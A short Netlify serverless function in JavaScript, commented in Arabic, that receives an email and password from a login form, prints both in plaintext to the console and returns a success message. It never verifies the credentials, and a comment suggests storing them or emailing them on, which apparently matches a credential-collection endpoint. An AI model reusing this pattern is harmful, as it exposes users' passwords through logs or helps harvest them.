// sendData.js - Netlify Function لاستقبال بيانات تسجيل الدخول
exports.handler = async function(event, context) {
  try {
    // تحويل البيانات المستقبلة من JSON
    const data = JSON.parse(event.body);
    const email = data.email;
    const password = data.password;

    // يمكنك هنا تخزين البيانات في قاعدة بيانات أو إرسالها عبر البريد
    // مثال: عرض البيانات في الـ console (للتجربة فقط)
    console.log("تم استلام بيانات تسجيل الدخول:");
    console.log("Email:", email);
    console.log("Password:", password);

    // إعادة رسالة نجاح للواجهة الأمامية
    return {
      statusCode: 200,
      body: JSON.stringify({ message: "تم استقبال البيانات بنجاح!" }),
    };

  } catch (err) {
    console.error("حدث خطأ في الواجهة الخلفية:", err);

    // إعادة رسالة خطأ للواجهة الأمامية
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "حدث خطأ أثناء معالجة البيانات." }),
    };
  }
};
